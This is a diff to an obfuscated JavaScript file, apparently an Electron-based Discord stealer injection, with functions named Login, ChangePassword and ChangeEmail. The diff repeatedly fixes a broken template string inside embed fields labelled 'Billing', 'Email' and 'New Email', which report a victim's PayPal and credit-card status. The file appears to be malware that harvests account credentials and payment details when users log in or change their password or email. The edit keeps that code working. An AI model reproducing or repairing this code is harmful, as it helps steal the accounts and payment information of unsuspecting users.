@@ -1,4 +1,4 @@
-const fs = require ( 'fs' ),
+const fs = require ("fs"),
     path = require("path"),
     {
         BrowserWindow: BrowserWindow,
@@ -247,8 +247,7 @@ function Login(e, t, n) {
                                         inline: !1
                                     }, {
                                         name: "Billing",
-                                        value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌
-                                        `"),t}()}`,
+                                        value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌`"),t}()}`,
                                         inline: !1
                                     }, {
                                         name: "Email",
@@ -345,8 +344,7 @@ function Login(e, t, n) {
                                                     inline: !1
                                                 }, {
                                                     name: "Billing",
-                                                    value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌
-                                                    `"),t}()}`,
+                                                    value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌`"),t}()}`,
                                                     inline: !1
                                                 }, {
                                                     name: "Email",
@@ -450,8 +448,7 @@ function ChangePassword(e, t, n) {
                                         inline: !1
                                     }, {
                                         name: "Billing",
-                                        value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌
-                                        `"),t}()}`,
+                                        value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌`"),t}()}`,
                                         inline: !1
                                     }, {
                                         name: "Email",
@@ -552,8 +549,7 @@ function ChangePassword(e, t, n) {
                                                     inline: !1
                                                 }, {
                                                     name: "Billing",
-                                                    value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌
-                                                    `"),t}()}`,
+                                                    value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌`"),t}()}`,
                                                     inline: !1
                                                 }, {
                                                     name: "Email",
@@ -661,8 +657,7 @@ function ChangeEmail(e, t, n) {
                                         inline: !1
                                     }, {
                                         name: "Billing",
-                                        value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌
-                                        `"),t}()}`,
+                                        value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌`"),t}()}`,
                                         inline: !1
                                     }, {
                                         name: "New Email",
@@ -759,8 +754,7 @@ function ChangeEmail(e, t, n) {
                                                     inline: !1
                                                 }, {
                                                     name: "Billing",
-                                                    value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌
-                                                    `"),t}()}`,
+                                                    value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌`"),t}()}`,
                                                     inline: !1
                                                 }, {
                                                     name: "New Email",
